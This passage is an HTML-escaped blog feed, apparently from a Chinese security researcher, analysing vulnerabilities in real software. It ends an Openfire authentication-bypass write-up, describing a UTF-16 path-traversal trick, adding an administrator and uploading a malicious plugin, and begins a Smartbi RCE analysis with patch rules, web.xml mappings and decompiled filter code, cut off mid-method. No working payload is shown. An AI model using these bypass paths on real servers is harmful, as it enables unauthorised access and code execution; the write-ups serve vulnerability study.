&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#66d9ef">if&lt;/span> (url.&lt;span style="color:#a6e22e">equals&lt;/span>(exclude)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#66d9ef">int&lt;/span> paramIndex &lt;span style="color:#f92672">=&lt;/span> url.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;?&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#66d9ef">if&lt;/span> (paramIndex &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                url &lt;span style="color:#f92672">=&lt;/span> url.&lt;span style="color:#a6e22e">substring&lt;/span>(0, paramIndex);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#66d9ef">if&lt;/span> (url.&lt;span style="color:#a6e22e">equals&lt;/span>(exclude)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>   &lt;/p>
&lt;p>但该代码没有考虑到其他形式的UNICODE编码，而后端却可以解析该url，导致可以使用UTF-16编码绕过目录穿越检查，并且由于可以匹配&lt;code>/setup/setup-&lt;/code>*，也无需身份验证，即攻击者可以利用该漏洞绕过身份验证，任意访问后台。&lt;/p>
&lt;p>攻击者可以利用该漏洞添加管理员，而后通过管理员身份上传恶意插件，造成代码执行。&lt;/p>
&lt;p>&lt;strong>结果&lt;/strong>&lt;/p>
&lt;p>通过该漏洞添加管理员账户&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-32315-Openfire-auth-bypass.zh-cn.assets/1.png" />
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-32315-Openfire-auth-bypass.zh-cn.assets/2.png" />&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm" target="_blank">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-06-20T17:42:33+08:00&lt;/strong>&lt;/p></description></item><item><title>Smartbi RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</link><pubDate>Fri, 16 Jun 2023 16:07:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;blockquote>
&lt;p>Smartbi是广州思迈特软件有限公司旗下的商业智能BI和数据分析品牌，为企业客户提供一站式商业智能解决方案。Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。&lt;/p>
&lt;p>Smartbi大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用stub接口构造请求绕过补丁限制，进而控制JDBC URL，最终可导致远程代码执行或信息泄露。&lt;/p>
&lt;/blockquote>
&lt;p>引用自
&lt;a href="https://nox.qianxin.com/vulnerability/detail/QVD-2023-5326" target="_blank">奇安信NOX&lt;/a>&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>V7&amp;lt;= Smartbi &amp;lt;= V10.5.8&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>官网下载Smartbi V10.5.8即可，直接安装。&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>解包官网提供的补丁包，可以发现如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;version&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;1.0&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;date&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2023-02-28 15:00:00&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;patches&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;PATCH_20230228&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;修复了利用stub接口对 ‘DB2 命令执行漏洞’ 补丁进行绕过的远程命令执行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc_zh_TW&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;修復了利用stub接口對 ‘DB2 命令執行漏洞’ 補丁進行繞過的遠程命令執行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc_en&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;urls&amp;#34;&lt;/span>: [{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;*.stub&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;rules&amp;#34;&lt;/span>: [{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;RejectStubPostPatchRule&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;PATCH_20221122&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc_zh_TW&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc_en&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;urls&amp;#34;&lt;/span>: [{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/vision/RMIServlet&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;rules&amp;#34;&lt;/span>: [{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;className&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;DataSourceService&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;methodName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;testConnectionList&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;RejectRMIParamsStringsPatchRule&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;strings&amp;#34;&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;clientRerouteServerListJNDIName&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;className&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;DataSourceService&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;methodName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;testConnection&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;RejectRMIParamsStringsPatchRule&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;strings&amp;#34;&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;clientRerouteServerListJNDIName&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看出来，补丁包对符合正则表达式&lt;code>*.stub&lt;/code> 的url进行了处理，再根据补丁描述不难发现前一个补丁补的漏洞：DB2 命令执行漏洞。此处的漏洞应该是对其进行了绕过。&lt;/p>
&lt;p>转到web.xml里面，*.stub是由RMIServlet进行处理的，且只有两个filter。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;servlet-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;servlet-name&amp;gt;&lt;/span>RMIServlet&lt;span style="color:#f92672">&amp;lt;/servlet-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;url-pattern&amp;gt;&lt;/span>*.stub&lt;span style="color:#f92672">&amp;lt;/url-pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/servlet-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-name&amp;gt;&lt;/span>CacheFilter&lt;span style="color:#f92672">&amp;lt;/filter-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;url-pattern&amp;gt;&lt;/span>*.stub&lt;span style="color:#f92672">&amp;lt;/url-pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-name&amp;gt;&lt;/span>GZIPFilter&lt;span style="color:#f92672">&amp;lt;/filter-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;url-pattern&amp;gt;&lt;/span>*.stub&lt;span style="color:#f92672">&amp;lt;/url-pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>继续查看web.xml，不难发现一些敏感接口均要经过CheckIsLoggedFilter，结合反编译的源码，猜测此filter为鉴权filter&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-name&amp;gt;&lt;/span>CheckIsLoggedFilter&lt;span style="color:#f92672">&amp;lt;/filter-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;url-pattern&amp;gt;&lt;/span>/vision/ExportServlet&lt;span style="color:#f92672">&amp;lt;/url-pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-name&amp;gt;&lt;/span>CheckIsLoggedFilter&lt;span style="color:#f92672">&amp;lt;/filter-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;url-pattern&amp;gt;&lt;/span>/vision/ExportHttpServlet&lt;span style="color:#f92672">&amp;lt;/url-pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-name&amp;gt;&lt;/span>CheckIsLoggedFilter&lt;span style="color:#f92672">&amp;lt;/filter-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;url-pattern&amp;gt;&lt;/span>/vision/DownloadExcelServlet&lt;span style="color:#f92672">&amp;lt;/url-pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;filter-name&amp;gt;&lt;/span>CheckIsLoggedFilter&lt;span style="color:#f92672">&amp;lt;/filter-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;url-pattern&amp;gt;&lt;/span>/vision/MigrateServlet&lt;span style="color:#f92672">&amp;lt;/url-pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/filter-mapping&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CheckIsLoggedFilter&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> javax.&lt;span style="color:#a6e22e">servlet&lt;/span>.&lt;span style="color:#a6e22e">Filter&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> IExtendCustomFilter customFilterChecker;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> Logger LOG &lt;span style="color:#f92672">=&lt;/span> Logger.&lt;span style="color:#a6e22e">getLogger&lt;/span>(CheckIsLoggedFilter.&lt;span style="color:#a6e22e">class&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> Map&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, List&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> AUTHORITYMAP &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* loaded from: smartbi-FreeQuery.jar:smartbi/freequery/filter/CheckIsLoggedFilter$IExtendCustomFilter.class */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">IExtendCustomFilter&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">authorityFiltering&lt;/span>(String str, String str2, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">destroy&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* JADX WARN: Removed duplicated region for block: B:137:0x060f A[RETURN] */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Code decompiled incorrectly, please refer to instructions dump.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> To view partially-correct code enable &amp;#39;Show inconsistent code&amp;#39; option in preferences
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doFilter&lt;/span>(javax.&lt;span style="color:#a6e22e">servlet&lt;/span>.&lt;span style="color:#a6e22e">ServletRequest&lt;/span> r9, javax.&lt;span style="color:#a6e22e">servlet&lt;/span>.&lt;span style="color:#a6e22e">ServletResponse&lt;/span> r10, javax.&lt;span style="color:#a6e22e">servlet&lt;/span>.&lt;span style="color:#a6e22e">FilterChain&lt;/span> r11) &lt;span style="color:#66d9ef">throws&lt;/span> java.&lt;span style="color:#a6e22e">io&lt;/span>.&lt;span style="color:#a6e22e">IOException&lt;/span>, javax.&lt;span style="color:#a6e22e">servlet&lt;/span>.&lt;span style="color:#a6e22e">ServletException&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method dump skipped, instructions count: 1568
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> To view this dump change &amp;#39;Code comments level&amp;#39; option to &amp;#39;DEBUG&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UnsupportedOperationException(&lt;span style="color:#e6db74">&amp;#34;Method not decompiled: smartbi.freequery.filter.CheckIsLoggedFilter.doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain):void&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">handleAutoLogin&lt;/span>(HttpServletRequest request) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (FreeQueryModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getUserManagerModule&lt;/span>().&lt;span style="color:#a6e22e">isLogged&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String headerUserName &lt;span style="color:#f92672">=&lt;/span> Bootstrap.&lt;span style="color:#a6e22e">getHeaderUserName&lt;/span>(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(headerUserName)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IState state &lt;span style="color:#f92672">=&lt;/span> (IState) request.&lt;span style="color:#a6e22e">getSession&lt;/span>().&lt;span style="color:#a6e22e">getAttribute&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;state&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">boolean&lt;/span> isLogged &lt;span style="color:#f92672">=&lt;/span> (state &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> state.&lt;span style="color:#a6e22e">getUser&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span> : &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>isLogged) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String headerPassword &lt;span style="color:#f92672">=&lt;/span> Bootstrap.&lt;span style="color:#a6e22e">getHeaderPassword&lt;/span>(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (headerPassword &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> headerPassword &lt;span style="color:#f92672">=&lt;/span> SmartbiXDataSetUtil.&lt;span style="color:#a6e22e">OTHER&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FreeQueryModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getStateModule&lt;/span>().&lt;span style="color:#a6e22e">doStartRequest&lt;/span>(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">boolean&lt;/span> isAutoLogin &lt;span style="color:#f92672">=&lt;/span> FreeQueryModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getUserManagerModule&lt;/span>().&lt;span style="color:#a6e22e">login&lt;/span>(headerUserName, headerPassword);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (isAutoLogin) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> request.&lt;span style="color:#a6e22e">setAttribute&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;isNeedAutoLogout&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而*.stub并未经过这个filter的处理，也就是未授权即可访问。&lt;/p>
&lt;p>转到Smartbi的RMIServlet中有如下代码，进行GET请求时，携带jsonpCallback参数即可转到doPost方法，该方法通过RMIUtil.parseRMIInfo方法获取RMI信息，跟进。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doGet&lt;/span>(HttpServletRequest req, HttpServletResponse resp) &lt;span style="color:#66d9ef">throws&lt;/span> ServletException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String uri &lt;span style="color:#f92672">=&lt;/span> req.&lt;span style="color:#a6e22e">getRequestURI&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
